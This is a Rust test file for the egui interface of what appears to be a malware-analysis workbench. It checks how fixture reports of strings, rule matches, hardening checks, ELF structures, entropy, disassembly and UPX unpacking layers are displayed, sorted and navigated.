            .filter(|text| text.len() < 48)
            .collect::<Vec<_>>()
    );
}

fn paint_rows(
    ctx: &egui::Context,
    report: &AnalysisReport,
    kind: AnalysisKind,
    listing: Option<&Listing>,
) -> egui::FullOutput {
    let mut state = WorkspaceState::default();
    let size = egui::vec2(1280.0, 820.0);
    let pages = (None, listing);
    let mut output = frame(ctx, report, &mut state, Some(kind), size, Vec::new(), pages).0;
    for _ in 0..2 {
        output = frame(ctx, report, &mut state, Some(kind), size, Vec::new(), pages).0;
    }
    output
}

fn meaning_report() -> AnalysisReport {
    let record = |id, data| AnalysisRecord {
        revision: 1,
        id,
        location: None,
        data,
    };
    let mut report = AnalysisReport {
        id: "meaning".into(),
        state: AnalysisState::Complete,
        source_path: "/fixture/meaning".into(),
        specimen_sha256: None,
        specimen_len: Some(4096),
        reason: None,
        sections: Vec::new(),
        layer: None,
        specimen_source: None,
    };
    report.sections.push(AnalysisSection {
        kind: AnalysisKind::Strings,
        state: AnalysisSectionState::Complete,
        summary: "two strings".into(),
        tools: Vec::new(),
        listing: None,
        entries: vec![
            AnalysisEntry {
                label: "ASCII".into(),
                value: "plain".into(),
                offset: Some(0),
                record: Some(record(
                    1,
                    AnalysisData::String {
                        encoding: "ASCII".into(),
                        byte_len: 5,
                        retained_len: 5,
                    },
                )),
            },
            AnalysisEntry {
                label: "UTF-16LE".into(),
                value: "wide".into(),
                offset: Some(32),
                record: Some(record(
                    2,
                    AnalysisData::String {
                        encoding: "UTF-16LE".into(),
                        byte_len: 8,
                        retained_len: 4,
                    },
                )),
            },
        ],
    });
    report.sections.push(AnalysisSection {
        kind: AnalysisKind::Rules,
        state: AnalysisSectionState::Complete,
        summary: "two matches".into(),
        tools: Vec::new(),
        listing: None,
        entries: vec![
            AnalysisEntry {
                label: "PackedDropper".into(),
                value: "matched bytes".into(),
                offset: None,
                record: Some(record(
                    3,
                    AnalysisData::RuleMatch {
                        rule: "PackedDropper".into(),
                        namespace: "ns".into(),
                        tags: vec!["high".into()],
                        ruleset: "core".into(),
                    },
                )),
            },
            AnalysisEntry {
                label: "Note".into(),
                value: "a note".into(),
                offset: None,
                record: Some(record(
                    4,
                    AnalysisData::RuleMatch {
                        rule: "Note".into(),
                        namespace: "ns".into(),
                        tags: vec!["FILE".into()],
                        ruleset: "core".into(),
                    },
                )),
            },
        ],
    });
    report.sections.push(AnalysisSection {
        kind: AnalysisKind::Hardening,
        state: AnalysisSectionState::Complete,
        summary: "two checks".into(),
        tools: Vec::new(),
        listing: None,
        entries: vec![
            AnalysisEntry {
                label: "NX compatible".into(),
                value: "declared".into(),
                offset: None,
                record: Some(record(
                    5,
                    AnalysisData::Property {
                        scope: "Static file metadata".into(),
                        observed: "declared".into(),
                        evidence: "NX compatible".into(),
                    },
                )),
            },
            AnalysisEntry {
                label: "ASLR dynamic base".into(),
                value: "not declared".into(),
                offset: None,
                record: Some(record(
                    6,
                    AnalysisData::Property {
                        scope: "Static file metadata".into(),
                        observed: "not declared".into(),
                        evidence: "ASLR dynamic base".into(),
                    },
                )),
            },
        ],
    });
    report.sections.push(AnalysisSection {
        kind: AnalysisKind::Structures,
        state: AnalysisSectionState::Complete,
        summary: "mixed structures".into(),
        tools: Vec::new(),
        listing: None,
        entries: vec![
            AnalysisEntry {
                label: "EI_CLASS".into(),
                value: "ELF64".into(),
                offset: None,
                record: Some(record(
                    7,
                    AnalysisData::Field {
                        group: "Headers".into(),
                    },
                )),
            },
            AnalysisEntry {
                label: "Section".into(),
                value: "code".into(),
                offset: Some(0),
                record: Some(record(
                    8,
                    AnalysisData::Section {
                        name: ".text".into(),
                        address: 0x1000,
                        virtual_size: 32,
                        file_size: Some(32),
                        raw_flags: "0x6".into(),
                        flags: vec!["EXECINSTR".into()],
                    },
                )),
            },
            AnalysisEntry {
                label: "Segment".into(),
                value: "data".into(),
                offset: Some(64),
                record: Some(record(
                    9,
                    AnalysisData::Section {
                        name: ".data".into(),
                        address: 0x2000,
                        virtual_size: 16,
                        file_size: Some(16),
                        raw_flags: "0x6".into(),
                        flags: vec!["WRITE".into()],
                    },
                )),
            },
            AnalysisEntry {
                label: "Import".into(),
                value: "libc".into(),
                offset: None,
                record: Some(record(
                    10,
                    AnalysisData::Import {
                        name: Some("puts".into()),
                        library: Some("libc".into()),
                        ordinal: None,
                    },
                )),
            },
        ],
    });
    report.sections.push(AnalysisSection {
        kind: AnalysisKind::Entropy,
        state: AnalysisSectionState::Complete,
        summary: "chart".into(),
        tools: Vec::new(),
        listing: None,
        entries: vec![AnalysisEntry {
            label: "block".into(),
            value: "4.000".into(),
            offset: Some(0),
            record: Some(record(
                11,
                AnalysisData::Entropy {
                    range: AnalysisRange { offset: 0, len: 16 },
                    milli_bits: 4000,
                },
            )),
        }],
    });
    report
}

#[test]
fn lists_are_colored_by_meaning_and_entropy_stays_a_chart() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let report = meaning_report();
    let strings = paint_rows(&ctx, &report, AnalysisKind::Strings, None);
    expect_color(&strings, "ASCII", crate::theme::palette().string);
    expect_color(&strings, "UTF-16LE", crate::theme::info());
    expect_color(&strings, "plain", crate::theme::text());
    let rules = paint_rows(&ctx, &report, AnalysisKind::Rules, None);
    expect_color(&rules, "PackedDropper", crate::theme::error());
    expect_color(&rules, "Note", crate::theme::warn());
    let hardening = paint_rows(&ctx, &report, AnalysisKind::Hardening, None);
    expect_color(&hardening, "declared", crate::theme::good());
    expect_color(&hardening, "not declared", crate::theme::error());
    let structures = paint_rows(&ctx, &report, AnalysisKind::Structures, None);
    expect_color(&structures, "EI_CLASS", crate::theme::muted());
    expect_color(&structures, ".text", crate::theme::blue());
    expect_color(&structures, ".data", crate::theme::info());
    expect_color(&structures, "puts", crate::theme::warn());

    let mut listed = meaning_report();
    for kind in [AnalysisKind::Strings, AnalysisKind::Structures] {
        let section = listed
            .sections
            .iter_mut()
            .find(|section| section.kind == kind)
            .unwrap();
        section.listing = Some(AnalysisListing {
            rows: section.entries.len() as u64,
            bytes: 0,
            truncated: false,
        });
        let page = listing_page(&listed, kind);
        let output = paint_rows(&ctx, &listed, kind, Some(&page));
        if kind == AnalysisKind::Strings {
            expect_color(&output, "ASCII", crate::theme::palette().string);
            expect_color(&output, "UTF-16LE", crate::theme::info());
        } else {
            expect_color(&output, ".text", crate::theme::blue());
            expect_color(&output, ".data", crate::theme::info());
            expect_color(&output, "puts", crate::theme::warn());
        }
    }

    let entropy = paint_rows(&ctx, &report, AnalysisKind::Entropy, None);
    let shown = texts(&entropy);
    assert!(
        shown
            .iter()
            .any(|(text, _)| text == "Measured regions / bits per byte (0..8)"),
        "entropy keeps its chart: {:?}",
        shown
            .iter()
            .map(|(text, _)| text.as_str())
            .collect::<Vec<_>>()
    );
    assert_eq!(text_color(&entropy, "4.000"), Some(crate::theme::text()));
}

/// A listing of functions: each is `(name, address, body rows)`, followed by
/// its rows as instructions or source lines.
fn code_report(kind: AnalysisKind, functions: &[(&str, u64, u32)]) -> (AnalysisReport, Listing) {
    let mut entries = Vec::new();
    let mut counted = Vec::new();
    for (name, address, rows) in functions {
        entries.push(instruction(
            entries.len() as u64 + 1,
            AnalysisData::Function {
                name: (*name).into(),
                address: *address,
                size: 99,
            },
        ));
        for line in 1..=*rows {
            let id = entries.len() as u64 + 1;
            entries.push(instruction(
                id,
                if kind == AnalysisKind::Disassembly {
                    AnalysisData::Instruction {
                        address: address + u64::from(line),
                        bytes: "90".into(),
                        mnemonic: "nop".into(),
                        operands: String::new(),
                        function: Some((*name).into()),
                    }
                } else {
                    AnalysisData::SourceLine {
                        function: (*name).into(),
                        address: None,
                        line,
                    }
                },
            ));
        }
        counted.push(antinomie_monitor_core::AnalysisFunctionLines {
            name: (*name).into(),
            address: *address,
            lines: u64::from(*rows),
        });
    }
    let mut report = fixture();
    let rows = entries.len();
    report.sections.push(AnalysisSection {
        kind,
        state: AnalysisSectionState::Complete,
        summary: String::new(),
        tools: Vec::new(),
        listing: None,
        entries,
    });
    let report = with_listing(report, kind, rows);
    let mut page = listing_page(&report, kind).unwrap();
    page.functions = counted;
    (report, Ok(page))
}

fn shown_in(
    ctx: &egui::Context,
    report: &AnalysisReport,
    kind: AnalysisKind,
    page: &Listing,
) -> Vec<(String, egui::Rect)> {
    let mut state = WorkspaceState::default();
    let size = egui::vec2(1280.0, 820.0);
    let mut output = egui::FullOutput::default();
    for _ in 0..3 {
        output = frame(
            ctx,
            report,
            &mut state,
            Some(kind),
            size,
            Vec::new(),
            (None, Some(page)),
        )
        .0;
    }
    texts(&output)
}

#[test]
fn a_function_has_its_instructions_in_disassembly_and_its_source_lines_in_decompilation() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let functions = [("_start", 0x1000, 7), ("main", 0x2000, 1)];
    for (kind, header) in [
        (AnalysisKind::Disassembly, "_start  ·  0x1000, 7 lines"),
        (AnalysisKind::Decompilation, "_start  ·  0x1000, 7 lines"),
    ] {
        let (report, page) = code_report(kind, &functions);
        let shown = shown_in(&ctx, &report, kind, &page);
        let has = |text: &str| shown.iter().any(|(shown, _)| shown == text);
        assert!(has("0x1000 · 7 lines"), "{kind:?} sidebar: {shown:?}");
        assert!(has("0x2000 · 1 line"), "{kind:?} sidebar: {shown:?}");
        assert!(has("Functions · 2"), "{kind:?}: {shown:?}");
        assert!(has(header), "{kind:?} header row: {shown:?}");
        assert!(
            !shown
                .iter()
                .any(|(text, _)| text.contains("bytes") && text.contains("0x1000")),
            "no byte size beside a function: {shown:?}"
        );
    }
    // The count follows the whole listing, so the sidebar differs by view.
    let (report, page) = code_report(AnalysisKind::Decompilation, &[("_start", 0x1000, 3)]);
    let shown = shown_in(&ctx, &report, AnalysisKind::Decompilation, &page);
    assert!(shown.iter().any(|(text, _)| text == "0x1000 · 3 lines"));
}

#[test]
fn both_hosts_draw_the_sidebar_with_the_shared_widget() {
    // The Cores view and Static analysis wrap `code_listing::function_list`;
    // the same function reads the same in each.
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let (report, page) = code_report(AnalysisKind::Disassembly, &[("shared", 0x4000, 5)]);
    let static_texts = shown_in(&ctx, &report, AnalysisKind::Disassembly, &page);
    let function = crate::code_listing::Function {
        name: "shared",
        address: 0x4000,
        lines: Some(5),
    };
    let detail = crate::code_listing::detail_text(&function);
    assert!(
        static_texts.iter().any(|(text, _)| *text == detail),
        "{static_texts:?}"
    );
}

fn file_info_report() -> AnalysisReport {
    let mut report = fixture();
    report
        .sections
        .push(AnalysisSection::new(AnalysisKind::Entropy));
    report
}

fn hover(
    ctx: &egui::Context,
    report: &AnalysisReport,
    state: &mut WorkspaceState,
    at: egui::Pos2,
) -> Vec<(String, egui::Rect)> {
    ctx.style_mut(|style| {
        style.interaction.tooltip_delay = 0.0;
        style.interaction.tooltip_grace_time = 0.0;
    });
    let size = egui::vec2(1280.0, 820.0);
    let mut output = egui::FullOutput::default();
    for frame_number in 0..4 {
        let events = if frame_number == 0 {
            vec![egui::Event::PointerMoved(at)]
        } else {
            Vec::new()
        };
        output = ctx.run(
            egui::RawInput {
                screen_rect: Some(egui::Rect::from_min_size(egui::Pos2::ZERO, size)),
                events,
                time: Some(f64::from(frame_number)),
                ..Default::default()
            },
            |ctx| {
                egui::CentralPanel::default().show(ctx, |ui| {
                    workspace(ui, Some(report), state, None, None);
                });
            },
        );
    }
    texts(&output)
}

#[test]
fn categories_the_report_lacks_are_disabled_with_a_tooltip_and_the_others_count_rows() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let report = fixture();
    let mut state = WorkspaceState::default();
    let size = egui::vec2(1280.0, 820.0);
    let mut output = egui::FullOutput::default();
    for _ in 0..3 {
        output = frame(
            &ctx,
            &report,
            &mut state,
            None,
            size,
            Vec::new(),
            (None, None),
        )
        .0;
    }
    let shown = texts(&output);
    let at = |label: &str| {
        shown
            .iter()
            .find(|(text, _)| text == label)
            .unwrap_or_else(|| panic!("{label}: {shown:?}"))
            .1
    };
    // Strings has 1024 rows; Binwalk is not in this report.
    assert!(shown.iter().any(|(text, _)| text == "1024"), "{shown:?}");
    let tip = hover(&ctx, &report, &mut state, at("Binwalk").center());
    assert!(tip.iter().any(|(text, _)| text == NOT_REQUESTED), "{tip:?}");
    state.tab = Tab::Strings;
    let before = state.tab;
    let pressed = press(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        (egui::PointerButton::Primary, at("Disassembly").center()),
        (None, None),
    );
    assert!(pressed.action.is_none());
    assert_eq!(state.tab, before, "a disabled category takes no click");
}

#[test]
fn file_info_views_are_a_segmented_control_that_disables_the_missing_ones() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let report = file_info_report();
    let mut state = WorkspaceState::default();
    let size = egui::vec2(1280.0, 820.0);
    let mut output = egui::FullOutput::default();
    for _ in 0..3 {
        output = frame(
            &ctx,
            &report,
            &mut state,
            None,
            size,
            Vec::new(),
            (None, None),
        )
        .0;
    }
    let shown = texts(&output);
    let labels = [
        "Summary",
        "Headers",
        "Sections",
        "Segments",
        "Hardening",
        "Identification",
        "Entropy",
    ];
    for label in labels {
        assert!(
            shown.iter().any(|(text, _)| text == label),
            "{label}: {shown:?}"
        );
    }
    // Hardening is not in the fixture: its segment says why.
    let hardening = shown
        .iter()
        .find(|(text, _)| text == "Hardening")
        .unwrap()
        .1
        .center();
    let tip = hover(&ctx, &report, &mut state, hardening);
    assert!(tip
        .iter()
        .any(|(text, _)| text.starts_with("Not part of this analysis")));
    assert_eq!(state.file_info, FileInfo::Summary);
    let sections = shown
        .iter()
        .find(|(text, _)| text == "Sections")
        .unwrap()
        .1
        .center();
    let click = press(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        (egui::PointerButton::Primary, sections),
        (None, None),
    );
    assert!(click.action.is_none());
    assert_eq!(
        state.file_info,
        FileInfo::Sections,
        "a segment selects its view"
    );
    let hardening = texts(&click.output)
        .into_iter()
        .find(|(text, _)| text == "Hardening")
        .unwrap()
        .1
        .center();
    press(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        (egui::PointerButton::Primary, hardening),
        (None, None),
    );
    assert_eq!(
        state.file_info,
        FileInfo::Sections,
        "a missing view cannot be selected"
    );
}

#[test]
fn the_identity_card_links_to_triage_properties() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let report = fixture();
    let mut state = WorkspaceState::default();
    let size = egui::vec2(1280.0, 820.0);
    let mut output = egui::FullOutput::default();
    for _ in 0..3 {
        output = frame(
            &ctx,
            &report,
            &mut state,
            None,
            size,
            Vec::new(),
            (None, None),
        )
        .0;
    }
    let shown = texts(&output);
    for card in ["Identity", "Categories"] {
        assert!(
            shown.iter().any(|(text, _)| text == card),
            "{card}: {shown:?}"
        );
    }
    let link = shown
        .iter()
        .find(|(text, _)| text == "Triage › Properties")
        .unwrap()
        .1
        .center();
    let click = press(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        (egui::PointerButton::Primary, link),
        (None, None),
    );
    assert_eq!(click.action, Some(ReportAction::OpenTriageProperties));
    // The categories card lists the ones the report lacks as not requested.
    assert!(shown.iter().any(|(text, _)| text == "Not requested"));
}

#[test]
fn the_identity_card_says_where_the_specimen_came_from() {
    for (source, shown) in [
        (None, None),
        (
            Some(antinomie_monitor_core::SpecimenSource::HostCopy),
            Some("host copy, hash matched guest"),
        ),
        (
            Some(antinomie_monitor_core::SpecimenSource::Guest),
            Some("fetched from guest"),
        ),
    ] {
        let ctx = egui::Context::default();
        crate::theme::install(&ctx);
        let mut report = fixture();
        report.specimen_source = source;
        let mut state = WorkspaceState::default();
        let size = egui::vec2(1280.0, 820.0);
        let mut output = egui::FullOutput::default();
        for _ in 0..3 {
            output = frame(
                &ctx,
                &report,
                &mut state,
                None,
                size,
                Vec::new(),
                (None, None),
            )
            .0;
        }
        let texts = texts(&output);
        let row = texts.iter().any(|(text, _)| text == "Specimen source");
        assert_eq!(row, shown.is_some(), "{source:?}");
        if let Some(label) = shown {
            assert!(texts.iter().any(|(text, _)| text == label), "{texts:?}");
        }
    }
}

#[test]
fn a_category_the_report_lacks_can_be_run_once_the_analysis_has_finished() {
    let size = egui::vec2(1280.0, 820.0);
    for (state, enabled) in [
        (AnalysisState::Partial, true),
        (AnalysisState::Complete, true),
        (AnalysisState::Running, false),
        (AnalysisState::Queued, false),
    ] {
        let ctx = egui::Context::default();
        crate::theme::install(&ctx);
        let mut report = fixture();
        report.state = state;
        let mut state = WorkspaceState::default();
        let mut output = egui::FullOutput::default();
        for _ in 0..3 {
            output = frame(
                &ctx,
                &report,
                &mut state,
                None,
                size,
                Vec::new(),
                (None, None),
            )
            .0;
        }
        let missing = ALL_KINDS
            .into_iter()
            .find(|kind| report.sections.iter().all(|section| section.kind != *kind))
            .unwrap();
        let run = texts(&output)
            .into_iter()
            .find(|(text, _)| text == "Run")
            .map(|(_, rect)| rect.center())
            .unwrap();
        let click = press(
            &ctx,
            &report,
            &mut state,
            None,
            size,
            (egui::PointerButton::Primary, run),
            (None, None),
        );
        let expected = enabled.then(|| ReportAction::RunCheck {
            report_id: report.id.clone(),
            kind: missing,
        });
        // A running analysis may only be cancelled.
        assert_eq!(
            click
                .action
                .filter(|action| matches!(action, ReportAction::RunCheck { .. })),
            expected,
            "{:?}",
            report.state
        );
    }
}

#[test]
fn selecting_a_row_hands_it_to_the_details_panel_once() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let report = fixture();
    let mut state = WorkspaceState::default();
    let size = egui::vec2(1280.0, 820.0);
    let mut output = egui::FullOutput::default();
    for _ in 0..3 {
        output = render(&ctx, &report, &mut state, size, Vec::new(), None).0;
    }
    let first = texts(&output)
        .into_iter()
        .find(|(text, _)| text == "0x0")
        .unwrap()
        .1
        .center();
    click(&ctx, &report, &mut state, size, first);
    render(&ctx, &report, &mut state, size, Vec::new(), None);
    let panel = |ctx: &egui::Context| {
        texts(&ctx.run(egui::RawInput::default(), |ctx| {
            egui::CentralPanel::default().show(ctx, details);
        }))
    };
    let shown = panel(&ctx);
    assert!(
        shown
            .iter()
            .any(|(text, _)| text == "from Static · Strings"),
        "{shown:?}"
    );
    assert!(shown.iter().any(|(text, _)| text == "fixture string 0"));
    let fresh = egui::Context::default();
    crate::theme::install(&fresh);
    assert!(panel(&fresh)
        .iter()
        .any(|(text, _)| text.starts_with("Nothing selected.")));
}

#[test]
fn a_tables_headers_sort_its_rows_ascending_then_descending() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let report = fixture();
    let mut state = WorkspaceState::default();
    let size = egui::vec2(1280.0, 820.0);
    // The first frame binds the state to the report; then pick the view.
    frame(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        Vec::new(),
        (None, None),
    );
    state.tab = Tab::FileInfo;
    state.file_info = FileInfo::Sections;
    let order = |output: &egui::FullOutput| {
        let mut rows: Vec<_> = texts(output)
            .into_iter()
            .filter(|(text, _)| text.starts_with(".fixture"))
            .collect();
        rows.sort_by(|a, b| a.1.top().total_cmp(&b.1.top()));
        rows.into_iter().map(|(text, _)| text).collect::<Vec<_>>()
    };
    let mut output = egui::FullOutput::default();
    for _ in 0..3 {
        output = frame(
            &ctx,
            &report,
            &mut state,
            None,
            size,
            Vec::new(),
            (None, None),
        )
        .0;
    }
    assert_eq!(order(&output)[..3], [".fixture0", ".fixture1", ".fixture2"]);
    let name = texts(&output)
        .into_iter()
        .find(|(text, _)| text.starts_with("Name"))
        .unwrap()
        .1
        .center();
    let primary = egui::PointerButton::Primary;
    press(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        (primary, name),
        (None, None),
    );
    let second = press(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        (primary, name),
        (None, None),
    );
    assert_eq!(
        order(&second.output)[..3],
        [".fixture9", ".fixture8", ".fixture7"],
        "descending by name"
    );
}

/// The screenshot report: the unit fixture plus a disassembly of six
/// functions, and the listing page that carries their line counts.
fn qa_report() -> (
    AnalysisReport,
    Option<antinomie_monitor_core::AnalysisListingPage>,
) {
    let names = [
        "_start",
        "main",
        "beacon_loop",
        "fetch_stage2",
        "decrypt_config",
        "persist",
    ];
    let functions: Vec<(&str, u64, u32)> = names
        .iter()
        .enumerate()
        .map(|(index, name)| (*name, 0x401000 + index as u64 * 0x100, 4 + index as u32 * 5))
        .collect();
    let (report, page) = code_report(AnalysisKind::Disassembly, &functions);
    (report, page.ok())
}

#[test]
fn a_strings_header_click_reads_the_whole_listing_in_that_order_and_keeps_the_page_meanwhile() {
    use crate::table_sort::testing;
    use antinomie_monitor_core::ListingSort;
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let report = with_listing(fixture(), AnalysisKind::Strings, 3);
    let page = listing_page(&report, AnalysisKind::Strings);
    let mut state = WorkspaceState::default();
    let actions = std::cell::RefCell::new(Vec::new());
    let mut show = |ui: &mut egui::Ui| {
        let action = workspace_section(
            ui,
            Some(&report),
            AnalysisKind::Strings,
            &mut state,
            None,
            Some(&page),
        );
        actions.borrow_mut().extend(action);
    };
    let ordered = |actions: &std::cell::RefCell<Vec<ReportAction>>| match actions.borrow().last() {
        Some(ReportAction::ReadListing { sort, start, .. }) => Some((*sort, *start)),
        _ => None,
    };
    let shown = testing::click(&ctx, "Text", &mut show);
    // The rows of the page on screen stay while the sorted order is read.
    assert!(
        shown.iter().any(|(text, _)| text == "fixture string 0"),
        "{shown:?}"
    );
    assert!(shown.iter().any(|(text, _)| text == "Sorting…"));
    let ascending = ListingSort {
        column: 3,
        descending: false,
        field: None,
    };
    assert_eq!(ordered(&actions), Some((Some(ascending), 0)));
    testing::click(&ctx, "Text", &mut show);
    let descending = ListingSort {
        column: 3,
        descending: true,
        field: None,
    };
    assert_eq!(ordered(&actions), Some((Some(descending), 0)));
}

#[test]
fn structures_and_record_headers_sort_the_whole_listing_by_their_field() {
    use crate::table_sort::testing;
    use antinomie_monitor_core::{ListingSort, StructureField};
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    for (kind, header, column, field) in [
        (AnalysisKind::Structures, "Value", 1, StructureField::Value),
        (
            AnalysisKind::Structures,
            "File offset",
            2,
            StructureField::Offset,
        ),
    ] {
        let report = with_listing(fixture(), kind, 3);
        let page = listing_page(&report, kind);
        let mut state = WorkspaceState::default();
        let actions = std::cell::RefCell::new(Vec::new());
        let mut show = |ui: &mut egui::Ui| {
            let action = workspace_section(ui, Some(&report), kind, &mut state, None, Some(&page));
            actions.borrow_mut().extend(action);
        };
        testing::click(&ctx, header, &mut show);
        let sort = match actions.borrow().last() {
            Some(ReportAction::ReadListing { sort, .. }) => *sort,
            other => panic!("no listing read after the {header} click: {other:?}"),
        };
        assert_eq!(
            sort,
            Some(ListingSort {
                column,
                descending: false,
                field: Some(field)
            }),
            "{header}"
        );
    }
}

fn unpacked_report() -> AnalysisReport {
    let layer = |index: u32, packer: Option<&str>, report_id: Option<&str>| AnalysisEntry {
        label: format!("Layer {index}"),
        value: "UPX".into(),
        offset: None,
        record: Some(AnalysisRecord {
            revision: 1,
            id: u64::from(index) + 1,
            location: None,
            data: AnalysisData::Layer {
                index,
                method: if index == 0 {
                    "original".into()
                } else {
                    "UPX (header repaired)".into()
                },
                sha256: format!("{index:x}").repeat(64),
                size: 322_464 * (u64::from(index) + 1),
                parent: index.checked_sub(1),
                packer: packer.map(str::to_owned),
                file: (index > 0).then(|| format!("layer-{index}.bin")),
                report_id: report_id.map(str::to_owned),
                note: if index == 0 {
                    "The magic in the loader header was overwritten.".into()
                } else {
                    String::new()
                },
            },
        }),
    };
    let mut section = AnalysisSection::new(AnalysisKind::Unpacking);
    section.state = AnalysisSectionState::Complete;
    section.summary = "Packed with UPX: 1 layer recovered, each one analysed on its own".into();
    section.entries = vec![
        layer(0, Some("UPX (header modified)"), None),
        layer(1, None, Some("unpack-fixture-L1")),
    ];
    AnalysisReport {
        id: "unpack-fixture".into(),
        state: AnalysisState::Complete,
        source_path: "/fixture/packed".into(),
        specimen_sha256: None,
        specimen_len: Some(322_464),
        reason: None,
        sections: vec![section],
        layer: None,
        specimen_source: None,
    }
}

#[test]
fn the_unpacking_tab_picks_a_layer_from_a_drop_down_and_opens_its_analysis() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let report = unpacked_report();
    let mut state = WorkspaceState::default();
    let size = egui::vec2(1280.0, 820.0);
    // Binding the report resets the view, so the tab is chosen after a frame.
    frame(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        Vec::new(),
        (None, None),
    );
    state.tab = Tab::Unpacking;
    let mut output = egui::FullOutput::default();
    for _ in 0..3 {
        output = frame(
            &ctx,
            &report,
            &mut state,
            None,
            size,
            Vec::new(),
            (None, None),
        )
        .0;
    }
    let shown = texts(&output);
    let has =
        |shown: &[(String, egui::Rect)], label: &str| shown.iter().any(|(text, _)| text == label);
    // The file as it came is chosen; no phase boxes and no link to itself.
    for label in [
        "Layer",
        "1 of 2",
        "As it came",
        "Packed with UPX (header modified)",
        "The magic in the loader header was overwritten.",
    ] {
        assert!(has(&shown, label), "{label} in {shown:?}");
    }
    assert!(!shown.iter().any(|(text, _)| text.starts_with("Phase ")));
    assert!(!has(&shown, "Show its analysis"));
    // The tab names its category in the strip.
    assert!(has(&shown, "Unpacking"));
    // Open the drop-down and choose the unpacked layer.
    let combo = shown
        .iter()
        .find(|(text, _)| text.starts_with("Layer 0 · As it came"))
        .expect("the drop-down shows the chosen layer")
        .1;
    let opened = press(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        (egui::PointerButton::Primary, combo.center()),
        (None, None),
    );
    let entry = texts(&opened.output)
        .into_iter()
        .find(|(text, _)| text.starts_with("Layer 1 · Unpacked by UPX (header repaired)"))
        .expect("the list names the unpacked layer")
        .1;
    press(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        (egui::PointerButton::Primary, entry.center()),
        (None, None),
    );
    assert_eq!(state.unpack_layer, 1);
    let mut output = egui::FullOutput::default();
    for _ in 0..3 {
        output = frame(
            &ctx,
            &report,
            &mut state,
            None,
            size,
            Vec::new(),
            (None, None),
        )
        .0;
    }
    let shown = texts(&output);
    for label in [
        "2 of 2",
        "Unpacked by UPX (header repaired)",
        "No packer found",
        "Show its analysis",
    ] {
        assert!(has(&shown, label), "{label} in {shown:?}");
    }
    assert!(!has(&shown, "Packed with UPX (header modified)"));
    let button = shown
        .iter()
        .find(|(text, _)| text == "Show its analysis")
        .unwrap()
        .1;
    let clicked = press(
        &ctx,
        &report,
        &mut state,
        None,
        size,
        (egui::PointerButton::Primary, button.center()),
        (None, None),
    );
    assert_eq!(
        clicked.action,
        Some(ReportAction::ShowReport {
            report_id: "unpack-fixture-L1".into()
        })
    );
    // A report without the check says so instead of drawing phases.
    let mut none = unpacked_report();
    none.sections.clear();
    let output = frame(
        &ctx,
        &none,
        &mut state,
        None,
        size,
        Vec::new(),
        (None, None),
    )
    .0;
    assert!(texts(&output)
        .iter()
        .any(|(text, _)| text.contains("was not part of this analysis")));
}

#[test]
fn strings_and_regex_share_a_tab_with_the_matches_on_the_right() {
    let ctx = egui::Context::default();
    crate::theme::install(&ctx);
    let report = with_listing(fixture(), AnalysisKind::Strings, 3);
    let page = listing_page(&report, AnalysisKind::Strings);
    let mut state = WorkspaceState::default();
    state.bind(&report.id);
    state.tab = Tab::Strings;
    let pages = (None, Some(&page));
    let at = |output: &egui::FullOutput, wanted: &str| {
        texts(output)
            .into_iter()
            .find(|(text, _)| text == wanted)
            .map(|(_, rect)| rect)
    };
    // The tab is named for both, and no separate button or window remains.
    let (output, action) = frame(
        &ctx,
        &report,
        &mut state,
        None,
        egui::vec2(1400.0, 800.0),
        Vec::new(),
        pages,
    );
    assert!(at(&output, "Strings & regex").is_some());
    assert!(!texts(&output)
        .iter()
        .any(|(text, _)| text.contains("Regex matches…")));
    // The first frame asks for the scan of this report, and only once.
    assert!(action.is_none());
    assert_eq!(state.take_regex_request().as_deref(), Some(&*report.id));
    let (output, again) = frame(
        &ctx,
        &report,
        &mut state,
        None,
        egui::vec2(1400.0, 800.0),
        Vec::new(),
        pages,
    );
    assert!(again.is_none() && state.take_regex_request().is_none());
    // Wide: the pane is right of the strings.
    let pane = at(&output, "Regex matches").expect("the pane's heading");
    let strings = at(&output, "fixture string 0")
        .unwrap_or_else(|| panic!("a string row in {:?}", texts(&output)));
    assert!(pane.left() > strings.right(), "{pane:?} {strings:?}");
    // Narrow: it sits under them.
    let mut narrow = None;
    for _ in 0..4 {
        narrow = Some(
            frame(
                &ctx,
                &report,
                &mut state,
                None,
                egui::vec2(700.0, 800.0),
                Vec::new(),
                pages,
            )
            .0,
        );
    }
    let narrow = narrow.unwrap();
    let pane = at(&narrow, "Regex matches").expect("the pane's heading");
    let strings = at(&narrow, "fixture string 0")
        .unwrap_or_else(|| panic!("a string row in {:?}", texts(&narrow)));
    assert!(pane.top() > strings.bottom(), "{pane:?} {strings:?}");
    // Other tabs have no pane.
    state.tab = Tab::Floss;
    let (floss, _) = frame(
        &ctx,
        &report,
        &mut state,
        None,
        egui::vec2(1400.0, 800.0),
        Vec::new(),
        pages,
    );
    assert!(at(&floss, "Regex matches").is_none());
}
